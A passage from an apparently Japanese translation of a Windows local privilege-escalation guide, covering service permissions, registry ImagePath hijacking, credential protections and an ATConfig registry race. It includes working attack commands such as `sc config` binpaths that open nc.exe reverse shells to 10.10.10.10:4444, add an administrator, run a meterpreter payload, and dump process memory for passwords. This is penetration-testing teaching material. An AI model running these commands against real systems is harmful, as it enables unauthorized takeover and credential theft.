  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`という警告が表示された場合は、プラットフォームがx64に設定されていることを確認してください。

### MSIのインストール

悪意のある`.msi`ファイルをバックグラウンドで**インストール**するには：

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus と検出ツール

### 監査設定

これらの設定は何が**記録されるか**を決めるため、注意を払う必要があります。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding では、ログがどこに送信されるのかを把握することが重要です。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** は、ドメインに参加しているコンピューター上の**ローカル Administrator パスワードを管理**するために設計されており、各パスワードが**一意でランダムに生成され、定期的に更新される**ようにします。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認してください**](../stealing-credentials/credentials-protections.md#wdigest)。

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護機能を導入し、信頼されていないプロセスによる**メモリの読み取り**やコードの挿入を**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks などの脅威からデバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに興味深い権限がないか確認しましょう。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、それを悪用して権限昇格する方法についてはこちらをご覧ください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**とは何かについて**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページでは、**興味深いtokenについて学び**、それを悪用する方法を確認できます:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッション

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示し、**プロセスのコマンドラインにパスワードが含まれていないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html) が可能か調べます。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に[**electron/cef/chromium debuggers**の実行有無を確認してください。権限昇格に悪用できる可能性があります](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

debugger listenerは短時間しか起動しない場合があるため、受動的なポートスナップショットで見つからなくても、過去に公開されていなかった証拠にはなりません。検出したlistenerについては、PID、プロセスの所有者、権限の低いユーザーがそのlistenerにアクセスできるかを照合してください。アプリケーション名やデバッグフラグだけでは、ユーザー間のコード実行が可能だとは判断できません。通常の列挙は受動的に行い、debuggerコマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリが置かれたフォルダーのアクセス権を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor directories

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイルで宣言された `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールされたタスクやサービスについては、その設定ファイルと、宣言されたモジュールディレクトリの ACL を確認してください。自分のトークンでそのディレクトリにファイルを作成できる場合、次回そのタスクやサービスがモジュールを読み込む際にコード実行が可能となるか、調査する候補になります。run-as アカウントの実効権限、アクティブな設定、モジュールの互換性、拒否設定や共有制限を確認してください。ディレクトリに書き込めることだけでは、権限昇格の証明にはなりません。[Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) では、実行時のモジュール読み込みについて説明しています。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows の Apache インストールでは、サービスの実行ファイルのパスと run-as アカウントを、アクティブな `httpd.conf` 内の `DocumentRoot` と比較してください。標準的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されたドキュメントルート（通常は `C:\xampp\htdocs`）の ACL を確認します。低権限ユーザーがそのルートにファイルを作成でき、Apache が `LocalSystem` として実行されている場合、サーバー側コード実行によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、指定された正確なパスが公開されていること、サーバー側ハンドラーがそのファイル形式を処理することを確認してください。ルートに書き込めることだけで証明できるのは、ファイルを作成できることだけです。書き込みテストは行わずに ACL を確認します:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

従来型の WAMP インストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit の構成では `C:\wamp\...`）を指し、その隣の `conf\httpd.conf` に設定があり、既定のルートが `C:\wamp64\www` または `C:\wamp\www` になっている場合があります。サービスの実行ファイル、実行ユーザー、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や virtual-host の上書きを含む）、ルートの ACL をまとめて確認してください。WAMP ディレクトリに書き込み可能だからといって、Apache が `SYSTEM` として動作することや、配置したファイルを実行することが証明されるわけではありません。[Windows サービスが設定を選択する方法については、Apache のドキュメントを参照してください](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### IIS の書き込み可能なルートとアプリケーションプールのネットワーク ID

IIS では、書き込み可能な物理ディレクトリが `applicationHost.config` 内の**有効なサイト／アプリケーション**に対応していることを確認し、設定されたプールとサーバー側のハンドラーを特定してください。配信ディレクトリに置いたコードがプールの権限で実行されるのは、IIS がそのファイル形式を処理し、該当するルートにアクセスできる場合に限られます。書き込み可能なディレクトリをコード実行とみなす前に、現在のユーザーが実効的にファイルを作成できるか、サイトが稼働中か、ハンドラーとパスごとの設定上書きがどうなっているかを確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルも別途確認が必要です。既定では、該当する .NET Framework のインストール先にある `Temporary ASP.NET Files` ディレクトリが使われますが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft は場所とアプリケーションごとのサブディレクトリについて説明しており](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)、[アプリケーションプール同士が互いを信頼しない場合は、コンパイルディレクトリを分離することを推奨しています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低権限のトークンで**特定の**アプリケーションのキャッシュ内にある生成ソースを変更できる場合は、そのアプリケーションがより高い権限の[ワーカープロセス ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)で再コンパイルするかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明になりません。キャッシュと有効なアプリケーション、実効トークンと ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングを照合してください。読み取り専用でメタデータを確認し、列挙中にコンパイルを発生させたり、キャッシュファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` に設定された IIS プールは、ローカルのトークンが低権限でも、通常は**ホストコンピューターのアカウント**としてドメインリソースに認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上ではコンピューターアカウントも使用します。`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` プールは、設定されたアカウントを使用します。[Microsoft はこれらの ID の種類](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[アプリケーションプールのネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)について説明しています。ID の設定が省略されている場合、プールの既定値を引き継ぐことがあります。既定値は IIS の世代によって異なるため、プール名から推測せず、実効設定を確認してください。コードがコンピューターアカウントのネットワーク ID を持つプールで実行される場合は、**該当するコンピューター**のディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメイン名前付けコンテキストに対するレプリケーション権限が必要です。マシンアカウントのチケットやホストの役割だけでは、その権限があるとは証明できません。受動的な列挙では、ファイルのアップロード、ネットワーク認証、チケット要求を行わず、設定と ACL を確認してください。

ヘルパープロセスを起動する ASP.NET ハンドラーを読み取れる場合は、リクエスト由来の値が認証、復号、検証、コマンド構築を通じてどう扱われるかを追跡してください。デコードしたトークンを `ProcessStartInfo("cmd", "/c ...")` に連結するハンドラーでは、シェルのメタ文字によってコマンドが変更される可能性があります。[Microsoft は `cmd` の特殊文字について説明しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない呼び出し元が実際にデコード後の値を制御でき、ハンドラーに到達できることを確認したうえで、実効アプリケーションプール ID または偽装 ID と、子プロセスの ID を特定してください。ソースコードの行が読めること、localhost のリスナーがあること、トークン形式に弱点があることだけでは、特権コマンド実行の証明になりません。受動的な列挙中は、偽造リクエストを送信したりヘルパーを実行したりせず、ソースとプール設定を確認してください。

Windows 上の PHP サービスでは、リクエストで制御できるパスが [`include` または `require`](https://www.php.net/manual/en/function.include.php) に渡されると、低権限ユーザーが書き込み可能な PHP ファイルがワーカーの ID で評価される可能性があります。リクエストがその処理に到達できること、解決されたパスが低権限ユーザーには変更可能でワーカーには読み取り可能なファイルを指すこと、該当する PHP のパス制限で include が許可されること、ワーカーが実際により高い権限で動作していることを確認してください。loopback のリスナーや書き込み可能なファイルだけでは、この連鎖は証明できません。受動的な列挙中にエンドポイントを呼び出さず、ソース、サービス ID、ファイル ACL を確認してください。

### メモリ内パスワードのマイニング

**sysinternals** の **procdump** を使うと、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスでは、**資格情報がメモリ内に平文で保存されている**ことがあります。メモリをダンプし、資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でないGUIアプリ

**SYSTEMとして実行されるアプリケーションでは、ユーザーがCMDを起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「コマンド プロンプト」を検索し、「クリックしてコマンド プロンプトを開く」をクリックする

### 特権アプリケーションによるプロジェクトファイルのインポート

低権限ユーザーが書き込み可能なドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポートするユーザーのアカウントで入力の信頼境界を越えます。**実際に書き込み可能なパス**、そのパスを開くプロセスまたはタスク、実効ID、パーサーのビルドを確認してください。[過去のGhidraプロジェクトのオープン／復元に関する問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトメタデータ内のXML外部エンティティが許可されていました。Windows上でネットワークエンティティを使うと、[送信SMBとNTLMのポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可する場合、インポートするアカウントの認証情報が送信される可能性があります。これは認証情報漏えいにつながる可能性を示すものであり、直ちに管理者アクセスを得られるわけではありません。応答を利用するには、別の認可済みまたは脆弱な経路が必要であり、現在のビルドについては実際のパッチ適用状況を確認する必要があります。受動的な列挙中に細工されたプロジェクトを開かないでください。インポートのワークフローとACLを調べてください。

## サービス

Service Control Manager (SCM) オブジェクトの[`SC_MANAGER_CREATE_SERVICE`権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存サービスに対する権限とは別です。この権限を指定した読み取り専用の[`OpenSCManager`アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査の手掛かりであり、新しいサービスを実行できる証明ではありません。[`CreateService`はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。このハンドルには作成時に要求したサービスアクセス権が付与されます。その後、サービスを再度開く際には別途アクセスチェックが行われ、元のハンドルを使用できる場合でも失敗することがあります。実効ローカルまたはリモートトークン、付与されたハンドル権限、サービスアカウント、開始ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成または開始しないでください。

リモートからサービスをインストールする経路については、SCM権限と、対象上で**同じネットワークログオン**が書き込み可能な共有、その共有の基盤となるNTFS ACL、サービスアカウントが実行可能なローカル実行ファイルのパスを照合してください。通常より広いSCM権限とファイル配置経路の両方が存在する場合、管理者以外のアカウントでもこの境界を越えられる可能性があります。管理共有は必須条件ではありません。共有への書き込み権限だけ、またはSCMのサービス作成権限の手掛かりだけでは、新しいサービスをより高い権限で開始できるとは言えません。

既存のサービスは、`ImagePath`に記載されているヘルパー実行ファイルが存在しなくても、起動時、シャットダウン時、または別のライフサイクルイベントでヘルパー実行ファイルを呼び出す場合があります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い権限で実行される場合、存在しないヘルパーファイルは条件付きで置き換え候補となります。**実際のサービスコードまたは文書化されたヘルパー呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリの作成権限、サービスID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であることやファイルが存在しないことだけでは、サービスがそのファイルを読み込む証拠にはなりません。受動的な調査ではサービスを開始または停止しないでください。

既存のサービスでは、[`SERVICE_START`により`StartService`に引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは[`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは別の権限です。開始権限を単なる制御権限以上のものとして扱う前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使用する場合は、サービスID、引数から書き込みまでの正確な処理、パス制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが特権昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーがある場合に限られます。書き込み可能なログや開始権限だけでは不十分です。受動的なインベントリ調査では、サービスを開始したりテストファイルを作成したりしないでください。

NSClient++監視エージェントでは、`nsclient.ini`を読み取れることは**設定調査の手掛かり**です。このファイルにはWeb認証情報が含まれる場合があり、`boot.ini`によって設定の参照先が別の場所に変更されている可能性もあります。実際のサービスアカウント、WEBリスナーとアクセス ポリシー、認証済みロールに設定またはスクリプトを変更する権限があるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または有効になっている別の実行経路）、コマンドを登録または変更する実効権限、そのコマンドをサービスIDで実行するトリガーが必要です。ループバックのみを待ち受けるリスナーでもローカルユーザーが接続できる場合がありますが、ファイルパス、パスワード、リスナーだけではそうした権限があるとは言えません。受動的な列挙では、秘密情報を表示したりWeb APIを呼び出したりせずに、メタデータと権限を確認してください。[NSClient++のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Webとスクリプトのセキュリティに関するガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath`が`nssm.exe`であるサービスについては、サービスの実際の実行アカウントと、`HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`の値を調べてください。[NSSMは子アプリケーションをここに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory`は設定された作業ディレクトリです。ラッパーの権限だけでサービスの境界全体を判断する前に、子実行ファイルとその親ディレクトリのACLを確認してください。その子が公開するローカルWCFまたはSOAPエンドポイントは、別途調査が必要な手掛かりです。低権限ユーザーがリスナーに接続できること、対象の操作がそのユーザーの入力を受け付けること、サービスの子プロセスがより高い権限で安全でない操作を実行することを確認してください。サービスアカウント、エンドポイントURL、書き込み可能なパスだけでは昇格の証拠になりません。受動的な列挙中にサービス操作を呼び出さないでください。

カスタムWCF操作では、呼び出し元が制御する文字列がPowerShell runspaceに渡される経路を追跡してください。[`Pipeline.Commands.AddScript`はスクリプトテキストを追加します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)。[`Pipeline.Invoke`はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windowsトランスポート認証情報を使用する`netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、その**特定の**操作を呼び出す権限とrunspaceの実効IDは別途確認する必要があります。低権限の呼び出し元の入力から、より高いサービスIDで実行される`AddScript`に至る経路はコード実行の境界です。待ち受けポート、認証済みクライアント、無関係なアセンブリ内の未使用メソッドだけでは証拠になりません。列挙中にエンドポイントを呼び出さず、デプロイされたサービス、コントラクト、認可、偽装設定を静的に確認してください。

Service Triggersを使うと、特定の条件（名前付きパイプ／RPCエンドポイントのアクティビティ、ETWイベント、IPの利用可能状態、デバイスの到着、GPOの更新など）が発生したときにWindowsがサービスを開始できます。SERVICE_START権限がなくても、トリガーを発生させて特権サービスを開始できることがよくあります。列挙と有効化の手法については、こちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio診断コレクターサービス

C/C++ツールを含むVisual Studioのインストール環境には、`LocalSystem`として実行されるよう設定された診断サービス`VSStandardCollectorService150`が含まれている場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、ジャンクションとオブジェクトマネージャーリンクの競合状態を利用して、サービスのDACLリセット先をリダイレクトしました。実証された昇格には、利用可能なVisual Studio Setup WMI ProviderのMSI修復経路と、その対象である`C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`も必要でした。このコンポーネントは2024年1月に修正されました。

受動的なトリアージでは、このサービスのアカウントとバイナリパスを調べ、Setup WMIコンパイラのパスが存在するかを確認し、インストール済みコンポーネントのパッチ適用状況を確認してください。サービスエントリ、Visual Studio製品のバージョン、コンパイラファイルだけでは、ホストに脆弱性があるとは言えません。サービスを開始したり修復を実行したりせずに調査できます。

サービスの一覧を取得します。

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permissions

サービスに関する情報を取得するには、**sc**を使用できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」がサービスを変更できるかどうかを確認することをおすすめします。

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生する場合（たとえば SSDPSRV の場合）:

_システム エラー 1058 が発生しました。_\
_サービスを開始できません。サービスが無効になっているか、有効なデバイスが関連付けられていません。_

次の方法で有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**（XP SP1では、サービス upnphost が動作するには SSDPSRV に依存する点に注意してください）**

**この問題を回避するもう1つの方法**は、次を実行することです。

```
sc.exe config usosvc start= auto
```

### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持つ場合、サービスの実行バイナリを変更できます。**sc** を変更して実行するには、以下の手順を実行します。

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスを再起動する

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限を通じて、さまざまな方法で権限昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再設定を許可します。
- **WRITE_DAC**: アクセス許可の再設定を可能にし、サービス設定を変更できるようになります。
- **WRITE_OWNER**: 所有権の取得とアクセス許可の再設定を可能にします。
- **GENERIC_WRITE**: サービス設定を変更する権限を継承します。
- **GENERIC_ALL**: サービス設定を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱なアクセス許可

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権ドメインアカウントとして実行されている一方で、**低い権限のユーザーがサービス EXE またはその親フォルダーを変更できる場合**、**バイナリを置き換えてサービスを再起動する**ことで、サービスを乗っ取れることがよくあります。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが置かれている**フォルダーへの書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**）。**\
サービスによって実行されるすべてのバイナリは **wmic**（system32 内にはありません）で取得でき、**icacls** でアクセス許可を確認できます。

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

**sc** と **icacls** も使用できます:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探してください。特に、サービス実行ファイルまたはその格納ディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用の流れは次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な悪意あるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動／サービスのトリガーを待ちます）。

自動チェックに便利なツール：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスが通常ユーザーによる再起動を許可していない場合は、起動時に自動で開始されるか、障害発生時に再起動するアクションが設定されているか、または利用しているアプリケーションから間接的に起動できるかを確認してください。

### サービスレジストリの変更権限

サービスレジストリを変更できるか確認してください。\
次のようにして、サービス**レジストリ**に対する**権限**を**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

元の権限テストでは、次のように述べられていました。

**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** に `FullControl` 権限があるかどうかを確認する必要があります。ある場合、サービスによって実行されるバイナリを変更できます。

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認してください。ACL エントリがあるだけでは、実際にアクセスできるとは限りません。拒否エントリ、現在のトークン、継承された権限も考慮する必要があります。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` 権限や `SERVICE_START` 権限とは別のものです。権限昇格にはさらに、利用可能なサービス構成フィールド、サービスを起動する手段、より高い権限を持つサービス ID が必要です。Microsoft の[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)と[サービスのアクセス権に関するリファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリの Path を変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### レジストリ symlink race による任意の HKLM value write (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成します。このキーは後に **SYSTEM** プロセスによって HKLM のセッションキーにコピーされます。レジストリの **symbolic link race** により、この特権付きの書き込み先を **任意の HKLM パス**にリダイレクトし、任意の HKLM **value write** を実現できます。<sup>[[18]](#references)</sup>

主な場所（例：On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの Accessibility 機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` はログオンや secure-desktop の切り替え時に作成され、ユーザーが書き込み可能です。

悪用の流れ (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. secure-desktop へのコピーをトリガーします（例：**LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ちます**。oplock が発動したら、**HKLM Session ATConfig** キーを保護された HKLM のターゲットへの **registry link** に置き換えます。
4. SYSTEM がリダイレクト先の HKLM パスに、攻撃者が選んだ値を書き込みます。

任意の HKLM value write ができたら、サービスの設定値を上書きして LPE に移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/コマンドライン)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

一般ユーザーが起動できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注:** 公開されている exploit の実装では、race の一環として workstation を lock します。

ツールの例 (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### サービスレジストリの AppendData/AddSubdirectory 権限

レジストリに対するこの権限がある場合、**そのレジストリの下にサブレジストリを作成できます**。Windows サービスの場合、これは**任意のコードを実行するのに十分です**:

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースまでの各文字列を末尾とするパスを順に実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のファイルを実行しようとします:

```bash
